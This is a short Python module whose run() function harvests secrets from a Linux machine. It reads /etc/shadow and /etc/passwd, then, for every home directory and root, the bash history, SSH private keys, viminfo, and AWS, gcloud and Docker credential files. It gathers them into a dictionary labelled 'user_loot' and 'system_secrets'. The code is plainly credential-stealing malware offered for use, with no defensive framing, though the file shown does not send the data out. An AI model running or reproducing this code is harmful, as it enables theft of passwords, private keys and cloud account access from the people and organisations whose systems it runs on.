import os

def read_file(path):
    try:
        if os.path.exists(path) and os.access(path, os.R_OK):
            with open(path, "r") as f:
                return f.read().strip()
    except:
        return None
    return None

def run():
    results = {
        "system_secrets": {},
        "user_loot": {},
        "cloud_configs": {}
    }

    # 1. System-Wide Secrets (Requires high privs)
    system_targets = {
        "shadow": "/etc/shadow",
        "passwd": "/etc/passwd",
        "hosts": "/etc/hosts"
    }
    for label, path in system_targets.items():
        content = read_file(path)
        if content:
            results["system_secrets"][label] = content

    # 2. Iterate through ALL users in /home
    # This keeps each user's data in their own neat folder
    home_base = "/home"
    users = [d for d in os.listdir(home_base) if os.path.isdir(os.path.join(home_base, d))]
    
    # Don't forget the current user (could be root or someone not in /home)
    current_home = os.path.expanduser("~/")
    users.append(os.path.basename(current_home))

    for user in set(users):
        user_path = os.path.join(home_base, user) if user != "root" else "/root"
        if not os.path.exists(user_path): continue
        
        results["user_loot"][user] = {
            "history": read_file(os.path.join(user_path, ".bash_history")),
            "ssh_keys": read_file(os.path.join(user_path, ".ssh/id_rsa")),
            "vim_info": read_file(os.path.join(user_path, ".viminfo"))
        }

        # 3. Separate Cloud/Service targets
        results["cloud_configs"][user] = {
            "aws": read_file(os.path.join(user_path, ".aws/credentials")),
            "gcloud": read_file(os.path.join(user_path, ".config/gcloud/credentials.db")),
            "docker": read_file(os.path.join(user_path, ".docker/config.json"))
        }

    return results

